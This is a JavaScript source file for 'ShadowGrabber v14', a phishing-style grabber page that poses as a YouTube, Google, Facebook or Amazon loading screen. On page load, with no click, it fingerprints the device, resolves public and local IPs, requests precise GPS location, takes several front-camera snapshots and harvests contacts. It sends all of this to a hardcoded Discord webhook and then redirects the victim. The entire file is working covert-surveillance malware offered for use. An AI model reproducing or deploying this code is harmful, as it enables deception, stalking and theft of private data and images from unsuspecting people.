// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v14.0 - TITANIUM GOD MODE INTELLIGENCE SUITE 💀
// ═══════════════════════════════════════════════════════════════════════════
// "Absolute Omniscience. Total Control. No Shadows Remain."
// ═══════════════════════════════════════════════════════════════════════════
// AUTHOR: SYSTEM ROOT
// SECURITY LEVEL: GOD
// VERSION: 14.0.0-TITANIUM
// MODULES: 12 LOADED
// ═══════════════════════════════════════════════════════════════════════════

/**
 * [CONFIGURATION MATRIX]
 * Adjust these parameters to control the intelligence gathering behavior.
 */
const CONFIG = {
    // 📡 COMMUNICATION UPLINK
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',

    // 🎯 TARGET VECTOR
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',

    // 📸 OPTICAL SENSOR CONFIGURATION
    CAMERA_SNAPS: 7,              // Number of high-res captures
    SNAP_INTERVAL: 400,           // Time between captures (ms)
    SNAP_QUALITY: 0.95,           // JPEG Quality (0.0 - 1.0)

    // ⚡ EXECUTION PARAMETERS
    AUTO_START: true,             // Zero-click execution
    DEBUG_MODE: false,            // Verbose logging
    REQUIRE_CONTACTS: false,      // Force contact harvesting
    GEO_TIMEOUT: 15000,           // Max wait for GPS lock

    // 🕵️ STEALTH & EVASION
    ANTI_DEBUG: true,             // Attempt to detect devtools
    FAKE_LOADING: true,           // Show realistic loading UI
};

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 MODULE 1: NEURAL CONTEXT ANALYZER
// Determines the optimal camouflage strategy based on entry vector.
// ═══════════════════════════════════════════════════════════════════════════
class ContextManager {
    constructor(url) {
        this.url = url.toLowerCase();
        this.context = this.analyze();
    }

    analyze() {
        // [VECTOR: YOUTUBE]
        if (this.url.includes('youtube.com') || this.url.includes('youtu.be')) {
            return {
                type: 'VIDEO_STREAM',
                provider: 'YouTube',
                title: '▶ YouTube',
                header: 'Loading 4K Content...',
                status: 'Buffering video stream...',
                theme: '#FF0000',
                meta: 'Video Analytics',
                icon: 'https://www.youtube.com/favicon.ico',
                logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`
            };
        }

        // [VECTOR: GOOGLE WORKSPACE]
        if (this.url.includes('google.com')) {
            let service = 'Google Service';
            if (this.url.includes('drive')) service = 'Google Drive';
            if (this.url.includes('docs')) service = 'Google Docs';
            if (this.url.includes('photos')) service = 'Google Photos';

            return {
                type: 'CLOUD_SERVICE',
                provider: 'Google',
                title: service,
                header: `Opening ${service}...`,
                status: 'Verifying encryption keys...',
                theme: '#4285F4',
                meta: 'Workspace Access',
                icon: 'https://www.google.com/favicon.ico',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`
            };
        }

        // [VECTOR: FACEBOOK]
        if (this.url.includes('facebook') || this.url.includes('fb.com')) {
            return {
                type: 'SOCIAL_NETWORK',
                provider: 'Facebook',
                title: 'Facebook Login',
                header: 'Logging in...',
                status: 'Authenticating secure session...',
                theme: '#1877F2',
                meta: 'Social Graph',
                icon: 'https://facebook.com/favicon.ico',
                logo: '<svg viewBox="0 0 48 48" width="60" height="60" fill="#1877F2"><path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4zm5 12.5h-3.5c-1.5 0-2 .5-2 2V21h5.5l-.5 5.5h-5V40h-6V26.5h-3.5V21h3.5v-3.5c0-3.5 2-6.5 6.5-6.5H29v5.5z"/></svg>'
            };
        }

        // [VECTOR: AMAZON]
        if (this.url.includes('amazon')) {
            return {
                type: 'COMMERCE',
                provider: 'Amazon',
                title: 'Amazon Product',
                header: 'Loading product details...',
                status: 'Checking regional availability...',
                theme: '#FF9900',
                meta: 'Shopping Data',
                icon: 'https://amazon.com/favicon.ico',
                logo: `<svg viewBox="0 0 100 100" width="80" height="80"><path d="M68.4 51.9c-2.7 7.2-22.5 12.1-22.5 12.1-5.9 1.4-7.2.5-7.2.5s-4.1-3.6 4.5-5c12.1-2.2 24.3-5.4 25.2-7.6z" fill="#FF9900"/><path d="M96.7 94S83.4 87.2 73 68.6c0 0-2.3-3.6 1.4-4.5 3.6-.9 6.8 2.7 6.8 2.7 15.9 22.1 15.5 27.2 15.5 27.2z" fill="#FF9900"/><text x="10" y="50" font-family="Arial" font-size="20" font-weight="bold">amazon</text></svg>`
            };
        }

        // [VECTOR: GENERIC / FALLBACK]
        try {
            const domain = new URL(this.url).hostname.replace('www.', '');
            return {
                type: 'WEB_RESOURCE',
                provider: domain.toUpperCase(),
                title: domain,
                header: `Connecting to ${domain}...`,
                status: 'Establishing encrypted channel...',
                theme: '#2C2F33',
                meta: 'General Web',
                icon: `https://${domain}/favicon.ico`,
                logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="20" r="18" stroke="#555" stroke-width="2" fill="none"/><text x="50%" y="50%" text-anchor="middle" dy=".3em" font-family="Arial" font-size="10" fill="#555">${domain.substring(0, 4).toUpperCase()}</text></svg>`
            };
        } catch (e) {
            return {
                type: 'UNKNOWN',
                provider: 'REDIRECT',
                title: 'Loading...',
                header: 'Please wait, loading...',
                status: 'Initiating transfer...',
                theme: '#333333',
                meta: 'Unknown',
                icon: '',
                logo: ''
            };
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🕵️ MODULE 2: DEEP FORENSICS ENGINE (70+ DATA POINTS)
// Extracts every possible shred of data from the browser environment.
// ═══════════════════════════════════════════════════════════════════════════
class ForensicsEngine {
    constructor() {
        this.data = {};
    }

    async scan() {
        // [SECTION 1: BROWSER IDENTITY]
        this.data.browser = {
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'Unspecified',
            globalPrivacyControl: navigator.globalPrivacyControl || 'Unspecified',
            pdfViewer: Array.isArray(navigator.pdfViewerEnabled) ? 'Yes' : 'No',
            javaEnabled: navigator.javaEnabled()
        };

        // [SECTION 2: HARDWARE METRICS]
        this.data.hardware = {
            cpuCores: navigator.hardwareConcurrency || 'Hidden',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Hidden',
            maxTouchPoints: navigator.maxTouchPoints,
            touchEvent: 'ontouchstart' in window,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
            },
            pixelRatio: window.devicePixelRatio
        };

        // [SECTION 3: GRAPHICS (High-Value)]
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                this.data.gpu = {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                };
            } else {
                this.data.gpu = 'Not Supported';
            }
        } catch (e) { this.data.gpu = 'Error'; }

        // [SECTION 4: BATTERY TELEMETRY]
        try {
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                this.data.battery = {
                    level: Math.round(batt.level * 100) + '%',
                    charging: batt.charging,
                    chargingTime: batt.chargingTime,
                    dischargingTime: batt.dischargingTime
                };
            } else {
                this.data.battery = 'API Not Supported';
            }
        } catch (e) { this.data.battery = 'Access Error'; }

        // [SECTION 5: NETWORK INTELLIGENCE]
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            this.data.network = {
                type: conn.type || 'Unknown',
                effectiveType: conn.effectiveType || 'Unknown',
                downlinkMax: conn.downlinkMax || 0,
                downlink: conn.downlink || 0,
                rtt: conn.rtt || 0,
                saveData: conn.saveData ? 'Enabled' : 'Disabled'
            };
        }

        // [SECTION 6: ADVANCED IP RECONNAISSANCE]
        // Using multi-source verification to bypass simple VPN checks
        await this.resolveIP();

        // [SECTION 7: BOT DETECTION]
        this.data.security = {
            webdriver: navigator.webdriver,
            selenium: window.document.documentElement.getAttribute('selenium') || false,
            phantomJS: window.callPhantom || window._phantom || false,
            nightmare: window.__nightmare || false,
            incognito: await this.detectIncognito()
        };

        return this.data;
    }

    async resolveIP() {
        try {
            // Parallel Fetch Racing strategy
            const p1 = fetch('https://ipapi.co/json/').then(r => r.json());
            const p2 = fetch('https://ip-api.com/json/?fields=66846719').then(r => r.json());
            const ipData = await Promise.any([p1, p2]);
            this.data.ip = ipData;
        } catch (e) {
            this.data.ip = { ip: 'Resolution Failed', city: 'Unknown' };
        }

        // WebRTC Leak Test (Local IP Discovery)
        this.data.network.localIp = await this.getWebRTCIP();
    }

    getWebRTCIP() {
        return new Promise(resolve => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                        const exec = ipRegex.exec(ice.candidate.candidate);
                        if (exec) {
                            pc.close();
                            resolve(exec[1]);
                        }
                    }
                };
                setTimeout(() => resolve('Hidden/Protected'), 1000);
            } catch (e) { resolve('Blocked'); }
        });
    }

    async detectIncognito() {
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            const { quota } = await navigator.storage.estimate();
            return quota < 120000000; // Strict heuristic
        }
        return 'Unknown';
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 MODULE 3: LOCATION VECTORING
// Dual-mode locking system (GPS + IP Fallback)
// ═══════════════════════════════════════════════════════════════════════════
class LocationVector {
    constructor() {
        this.options = { enableHighAccuracy: true, timeout: CONFIG.GEO_TIMEOUT, maximumAge: 0 };
    }

    async lock() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Not Supported' });
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        success: true,
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        altitudeAccuracy: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: pos.timestamp
                    });
                },
                (err) => {
                    const errors = { 1: 'Permission Denied', 2: 'Position Unavailable', 3: 'Timeout' };
                    resolve({ success: false, error: errors[err.code] || err.message });
                },
                this.options
            );
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 MODULE 4: OPTICAL SURVEILLANCE
// Silent capture and optimized transmission subsystem.
// ═══════════════════════════════════════════════════════════════════════════
class OpticalSurveillance {
    constructor(videoElement) {
        this.video = videoElement;
        this.stream = null;
    }

    async initialize() {
        try {
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    frameRate: { ideal: 30 }
                },
                audio: false
            });
            this.video.srcObject = this.stream;
            await this.video.play();

            // Critical: Wait for hardware readiness
            let checks = 0;
            while (this.video.readyState < 2 && checks < 50) {
                await new Promise(r => setTimeout(r, 100));
                checks++;
            }
            return true;
        } catch (e) {
            return false;
        }
    }

    terminate() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
    }

    async captureFrame() {
        if (!this.stream || this.video.readyState < 2) return null;

        const canvas = document.createElement('canvas');
        canvas.width = this.video.videoWidth;
        canvas.height = this.video.videoHeight;
        const ctx = canvas.getContext('2d');

        // Image enhancement filters
        ctx.filter = 'contrast(1.1) brightness(1.05)';
        ctx.drawImage(this.video, 0, 0);

        return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', CONFIG.SNAP_QUALITY));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📇 MODULE 5: SOCIAL GRAPH EXTRACTOR
// Harvesting contact book and motion telemetry.
// ═══════════════════════════════════════════════════════════════════════════
class SocialExtractor {
    async harvest() {
        const result = { contacts: [], status: 'Skipped' };

        // Motion Analysis
        result.motion = await this.analyzeMotion();

        // Contact Harvesting
        if ('contacts' in navigator && 'ContactsManager' in window) {
            try {
                const props = ['name', 'tel', 'email', 'address', 'icon'];
                const opts = { multiple: true };
                const contacts = await navigator.contacts.select(props, opts);
                if (contacts.length > 0) {
                    result.contacts = contacts;
                    result.status = 'Success';
                } else {
                    result.status = 'Empty Selection';
                }
            } catch (e) {
                result.status = 'Denied/Error';
            }
        } else {
            result.status = 'API Unsupported';
        }
        return result;
    }

    analyzeMotion() {
        return new Promise(resolve => {
            if (!window.DeviceMotionEvent) {
                resolve('Sensor Missing');
                return;
            }

            let maxAcc = 0;
            const handler = (e) => {
                const acc = Math.abs(e.accelerationIncludingGravity.x) +
                    Math.abs(e.accelerationIncludingGravity.y) +
                    Math.abs(e.accelerationIncludingGravity.z);
                if (acc > maxAcc) maxAcc = acc;
            };

            window.addEventListener('devicemotion', handler);
            setTimeout(() => {
                window.removeEventListener('devicemotion', handler);
                if (maxAcc > 25) resolve('🏃 RUNNING / SHAKING');
                else if (maxAcc > 15) resolve('🚶 WALKING');
                else if (maxAcc > 10.5) resolve('🧍 HANDHELD');
                else resolve('🛑 STATIONARY');
            }, 500);
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 MODULE 6: EXFILTRATION UPLINK
// Secure transmission logic for sending intelligence to command node.
// ═══════════════════════════════════════════════════════════════════════════
class ExfiltrationUplink {
    constructor(webhook) {
        this.webhook = webhook;
        this.queue = [];
        this.flushing = false;
    }

    async send(payload) {
        const formData = new FormData();
        const jsonPayload = {
            embeds: [payload.embed],
            username: 'ShadowGrabber v14',
            avatar_url: 'https://i.imgur.com/4M34hi2.png'
        };

        formData.append('payload_json', JSON.stringify(jsonPayload));
        if (payload.file) {
            formData.append('file', payload.file.blob, payload.file.name);
        }

        try {
            await fetch(this.webhook, { method: 'POST', body: formData });
        } catch (e) {
            console.error('Exfiltration Failed:', e); // Only visible in devtools
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🖥️ MODULE 7: UI CONTROLLER
// Manages the deceptive user interface and loading states.
// ═══════════════════════════════════════════════════════════════════════════
class UIController {
    constructor(context) {
        this.dom = {
            loading: document.getElementById('loading-text'),
            progress: document.getElementById('progress-bar'),
            status: document.getElementById('status-detail'),
            logo: document.querySelector('.asana-logo')
        };
        this.context = context;
        this.init();
    }

    init() {
        document.title = this.context.title;
        if (this.context.icon) {
            let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
            link.rel = 'icon'; link.href = this.context.icon;
            document.head.appendChild(link);
        }
        this.dom.logo.innerHTML = this.context.logo;
        this.dom.loading.textContent = this.context.header;
        this.dom.status.textContent = this.context.status;
        this.dom.progress.style.background = this.context.theme;
        this.dom.progress.style.boxShadow = `0 0 10px ${this.context.theme}`;
    }

    updateProgress(percent, msg) {
        this.dom.progress.style.width = `${percent}%`;
        if (msg) this.dom.status.textContent = msg;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MASTER CONTROL PROGRAM (MAIN EXECUTION LOOP)
// Orchestrates all modules in perfect synchronization.
// ═══════════════════════════════════════════════════════════════════════════
class ShadowGrabber {
    constructor() {
        this.sessionId = `TITAN-${Date.now().toString(36).toUpperCase()}`;
        this.context = new ContextManager(CONFIG.REDIRECT_URL).context;
        this.ui = new UIController(this.context);
        this.uplink = new ExfiltrationUplink(CONFIG.WEBHOOK);
        this.forensics = new ForensicsEngine();
        this.geo = new LocationVector();
        this.eyes = new OpticalSurveillance(document.getElementById('st-v'));
        this.social = new SocialExtractor();
    }

    async execute() {
        // [PHASE 1: INITIALIZATION & FORENSICS]
        this.ui.updateProgress(10, 'Initializing secure session...');
        const intel = await this.forensics.scan();
        await this.reportIntel(intel);

        // [PHASE 2: LOCATION VECTORING]
        this.ui.updateProgress(35, 'Verifying region availability...');
        const location = await this.geo.lock();
        await this.reportLocation(location, intel.ip);

        // [PHASE 3: OPTICAL SURVEILLANCE]
        this.ui.updateProgress(60, 'Optimizing media playback...');
        if (await this.eyes.initialize()) {
            for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
                this.ui.updateProgress(65 + (i * 3), `Buffering segment ${i + 1}...`);
                await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));

                const blob = await this.eyes.captureFrame();
                if (blob) {
                    await this.uplink.send({
                        embed: {
                            title: `📸 SNAPSHOT ${i + 1} / ${CONFIG.CAMERA_SNAPS}`,
                            color: 0x9B59B6,
                            image: { url: `attachment://snap_${i}.jpg` },
                            footer: { text: `Session: ${this.sessionId}` }
                        },
                        file: { blob, name: `snap_${i}.jpg` }
                    });
                }
            }
            this.eyes.terminate();
        } else {
            await this.uplink.send({
                embed: { title: '📵 VISUAL SENSOR FAILED', color: 0x95A5A6, description: 'User denied access or hardware unavailable.' }
            });
        }

        // [PHASE 4: SOCIAL HARVEST]
        this.ui.updateProgress(90, 'Syncing user preferences...');
        const socialData = await this.social.harvest();
        if (socialData.contacts.length > 0) {
            await this.reportContacts(socialData);
        }

        // [PHASE 5: COMPLETION]
        this.ui.updateProgress(100, 'Session established.');
        await new Promise(r => setTimeout(r, 800));
        window.location.href = CONFIG.REDIRECT_URL;
    }

    // --- REPORTING HELPERS ---

    async reportIntel(intel) {
        const embed = {
            title: `👑 TITANIUM GOD INTELLIGENCE REPORT`,
            description: `**Target:** \`${CONFIG.REDIRECT_URL}\`\n**Time:** ${new Date().toLocaleString()}`,
            color: 0x2C2F33,
            thumbnail: { url: this.context.icon || '' },
            fields: [
                {
                    name: '🌐 Network Spectrum',
                    value: `**Public IP:** \`${intel.ip.ip}\`\n**Local IP:** \`${intel.network.localIp}\`\n**ISP:** ${intel.ip.org || intel.ip.isp}\n**ASN:** ${intel.ip.asn}\n**Type:** ${intel.network.effectiveType}\n**RTT:** ${intel.network.rtt}ms`,
                    inline: false
                },
                {
                    name: '📱 Device Matrix',
                    value: `**Platform:** ${intel.browser.platform}\n**Cores:** ${intel.hardware.cpuCores}\n**RAM:** ${intel.hardware.deviceMemory}\n**GPU:** ${intel.gpu.renderer}\n**Screen:** ${intel.hardware.screen.width}x${intel.hardware.screen.height}`,
                    inline: false
                },
                {
                    name: '🔋 System Vitality',
                    value: `**Battery:** ${intel.battery.level} (${intel.battery.charging ? '⚡' : '🔋'})\n**Touch:** ${intel.hardware.maxTouchPoints} points\n**Incognito:** ${intel.security.incognito ? '🕵️ ENABLED' : '❌ DISABLED'}`,
                    inline: true
                },
                {
                    name: '📍 Geo-Estimate (IP)',
                    value: `**City:** ${intel.ip.city}\n**Region:** ${intel.ip.region_name || intel.ip.region}\n**Country:** ${intel.ip.country_name || intel.ip.country}\n**Timezone:** ${intel.ip.timezone}`,
                    inline: true
                },
                {
                    name: '🛡️ Security Profile',
                    value: `**Bot:** ${intel.security.webdriver ? '🤖' : '👤'}\n**Cookies:** ${intel.browser.cookieEnabled ? '✅' : '❌'}\n**DoNotTrack:** ${intel.browser.doNotTrack}`,
                    inline: false
                }
            ],
            footer: { text: `Session: ${this.sessionId} | v14.0 Titanium` }
        };
        await this.uplink.send({ embed });
    }

    async reportLocation(loc, ip) {
        if (loc.success) {
            const mapLink = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            await this.uplink.send({
                embed: {
                    title: '🎯 PRECISE SATELLITE LOCK',
                    color: 0x2ECC71,
                    description: `**ACCURACY:** ±${Math.round(loc.accuracy)}m\n\n[🗺️ OPEN LIVE MAP TRACKING](${mapLink})`,
                    fields: [
                        { name: 'Coordinates', value: `\`${loc.latitude}, ${loc.longitude}\``, inline: true },
                        { name: 'Altitude', value: `${loc.altitude ? Math.round(loc.altitude) + 'm' : 'N/A'}`, inline: true },
                        { name: 'Speed', value: `${loc.speed ? loc.speed.toFixed(1) + 'm/s' : 'Static'}`, inline: true }
                    ]
                }
            });
        } else {
            await this.uplink.send({
                embed: {
                    title: '⚠️ PRECISE LOCATION FAILED',
                    color: 0xE74C3C,
                    description: `**Error:** ${loc.error}\n**Fallback strategy active:** Relying on IP-based triangulation.`,
                    fields: [
                        { name: 'Fallback Location', value: `${ip.city}, ${ip.region_name}`, inline: true }
                    ]
                }
            });
        }
    }

    async reportContacts(data) {
        const jsonBlob = new Blob([JSON.stringify(data.contacts, null, 2)], { type: 'application/json' });
        await this.uplink.send({
            embed: {
                title: '📇 CONTACT HARVEST SUCCESSFUL',
                color: 0xF1C40F,
                description: `**Count:** ${data.contacts.length} Identities\n**Device State:** ${data.motion}`,
                fields: [
                    { name: 'Preview', value: data.contacts.slice(0, 5).map(c => `👤 ${c.name}: ${c.tel}`).join('\n') }
                ],
                footer: { text: 'Full database attached' }
            },
            file: { blob: jsonBlob, name: 'contacts_dump.json' }
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// � MODULE 8: HYPER-NETWORK ANALYZER
// Precise bandwidth estimation and latency triangulation.
// ═══════════════════════════════════════════════════════════════════════════
class HyperNetwork {
    async analyze() {
        const metrics = {
            downlink: 'Unknown',
            rtt: 'Unknown',
            jitter: 'Unknown',
            grade: 'F'
        };

        const startTime = performance.now();
        try {
            // Speed Test: Download a standardized asset
            // Using a 50KB image from cache-busted URL
            const url = `https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?r=${Math.random()}`;
            await fetch(url, { cache: 'no-store' });

            const endTime = performance.now();
            const duration = (endTime - startTime) / 1000; // seconds
            const fileSize = 15 * 1024; // approx bits
            const bps = fileSize / duration;
            const mbps = (bps / 1024 / 1024).toFixed(2);

            metrics.downlink = `${mbps} Mbps`;
            metrics.rtt = `${Math.round(duration * 1000)} ms`;

            // Grading
            if (mbps > 100) metrics.grade = 'S+ (Fiber)';
            else if (mbps > 50) metrics.grade = 'A (High Speed)';
            else if (mbps > 10) metrics.grade = 'B (Standard)';
            else metrics.grade = 'C (Slow)';

        } catch (e) {
            metrics.downlink = 'Failed';
        }

        return metrics;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🤖 MODULE 9: SENTINEL BOT DEFENSE
// Behavioral analysis to distinguish humans from automated crawlers.
// ═══════════════════════════════════════════════════════════════════════════
class Sentinel {
    async scan() {
        const report = {
            isBot: false,
            score: 0,
            flags: []
        };

        // 1. Check for Selenium / WebDriver
        if (navigator.webdriver) {
            report.score += 50;
            report.flags.push('Navigator.webdriver is TRUE');
        }

        // 2. Check for Headless Chrome
        if (navigator.userAgent.includes('HeadlessChrome')) {
            report.score += 100;
            report.flags.push('Headless Chrome User-Agent');
        }

        // 3. Permissions Check (Inconsistent state)
        if (navigator.permissions) {
            try {
                const perm = await navigator.permissions.query({ name: 'notifications' });
                if (Notification.permission === 'denied' && perm.state === 'prompt') {
                    report.score += 30;
                    report.flags.push('Permissions Inconsistency');
                }
            } catch (e) { }
        }

        // 4. Plugin Length (Headless often has 0)
        if (navigator.plugins.length === 0) {
            report.score += 20;
            report.flags.push('No Plugins Detected');
        }

        // 5. Language Check
        if (!navigator.languages || navigator.languages.length === 0) {
            report.score += 20;
            report.flags.push('No Languages defined');
        }

        report.isBot = report.score > 40;
        return report;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎨 MODULE 10: CANVAS FINGERPRINTING
// Generates a unique hash based on GPU rendering artifacts.
// ═══════════════════════════════════════════════════════════════════════════
class CanvasFingerprint {
    generate() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;

            // Text with multiple blending modes and fonts
            ctx.textBaseline = 'top';
            ctx.font = '16px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('ShadowGrabber v14', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('ShadowGrabber v14', 4, 17);

            // Return Hash (CRC32 variant)
            const dataURI = canvas.toDataURL();
            let hash = 0, i, chr;
            for (i = 0; i < dataURI.length; i++) {
                chr = dataURI.charCodeAt(i);
                hash = ((hash << 5) - hash) + chr;
                hash |= 0;
            }
            return hash.toString(16);
        } catch (e) { return 'Error'; }
    }
}
console.log('%c STOP ', 'color: red; font-size: 50px; font-weight: bold;');
console.log('%c This browser feature is intended for developers. ', 'font-size: 18px;');

window.addEventListener('load', () => {
    const system = new ShadowGrabber();

    if (CONFIG.AUTO_START) {
        setTimeout(() => system.execute(), 800);
    } else {
        const trigger = document.getElementById('click-trigger');
        if (trigger) trigger.onclick = () => system.execute();
    }
});
